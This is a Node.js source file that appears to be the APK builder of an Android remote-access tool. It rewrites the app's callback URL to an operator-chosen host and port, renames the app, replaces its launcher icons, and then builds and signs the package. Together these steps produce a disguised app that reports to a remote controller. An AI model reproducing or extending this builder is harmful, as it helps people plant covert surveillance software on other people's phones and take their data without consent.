const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const'),
    sharp = require('sharp');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 65555) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

/**
 * Customize the app with a custom name and logo
 * @param {string} appName - The custom app name
 * @param {string} logoPath - Path to the custom logo image file (PNG)
 * @param {function} cb - Callback function(error)
 */
function customizeApp(appName, logoPath, cb) {
    try {
        // Update app name in strings.xml
        const stringsXmlPath = path.join(CONST.smaliPath, 'res', 'values', 'strings.xml');
        updateAppName(stringsXmlPath, appName, (err) => {
            if (err) return cb(`Failed to update app name: ${err}`);
            
            // If no logo provided, we're done
            if (!logoPath) {
                return cb(false);
            }
            
            // Update app icons if logo is provided
            updateAppIcons(logoPath, (err) => {
                if (err) return cb(`Failed to update app icons: ${err}`);
                
                cb(false); // No error
            });
        });
    } catch (e) {
        return cb(`App customization error: ${e.message}`);
    }
}

/**
 * Update the app name in strings.xml
 * @param {string} stringsXmlPath - Path to the strings.xml file
 * @param {string} appName - The new app name
 * @param {function} cb - Callback function(error)
 */
function updateAppName(stringsXmlPath, appName, cb) {
    fs.readFile(stringsXmlPath, 'utf8', (err, data) => {
        if (err) return cb(`Failed to read strings.xml: ${err.message}`);
        
        // Replace app_name string
        const appNameRegex = /<string name="app_name">.*?<\/string>/;
        const updatedData = data.replace(appNameRegex, `<string name="app_name">${appName}</string>`);
        
        fs.writeFile(stringsXmlPath, updatedData, 'utf8', (err) => {
            if (err) return cb(`Failed to write strings.xml: ${err.message}`);
            return cb(false);
        });
    });
}

/**
 * Update app icons in all mipmap directories
 * @param {string} logoPath - Path to the custom logo image file
 * @param {function} cb - Callback function(error)
 */
function updateAppIcons(logoPath, cb) {
    // Define mipmap directories and icon sizes
    const mipmapDirs = [
        { dir: 'mipmap-mdpi', size: 48 },
        { dir: 'mipmap-hdpi', size: 72 },
        { dir: 'mipmap-xhdpi', size: 96 },
        { dir: 'mipmap-xxhdpi', size: 144 },
        { dir: 'mipmap-xxxhdpi', size: 192 }
    ];
    
    // Process each mipmap directory
    let completedDirs = 0;
    let hasError = false;
    
    mipmapDirs.forEach(({ dir, size }) => {
        const iconPath = path.join(CONST.smaliPath, 'res', dir, 'ic_launcher.png');
        
        // Resize and save the logo for each density
        resizeImage(logoPath, iconPath, size, (err) => {
            if (hasError) return; // Skip if we already encountered an error
            
            if (err) {
                hasError = true;
                return cb(`Failed to update icon for ${dir}: ${err.message}`);
            }
            
            completedDirs++;
            if (completedDirs === mipmapDirs.length) {
                // All icons have been processed
                return cb(false);
            }
        });
    });
}

/**
 * Resize an image to the specified size and save it to the target path
 * @param {string} sourcePath - Source image path
 * @param {string} targetPath - Target image path
 * @param {number} size - Target size (width and height)
 * @param {function} cb - Callback function(error)
 */
function resizeImage(sourcePath, targetPath, size, cb) {
    sharp(sourcePath)
        .resize(size, size)
        .png()
        .toFile(targetPath, (err) => {
            if (err) return cb(err);
            return cb(false);
        });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK,
    customizeApp
}
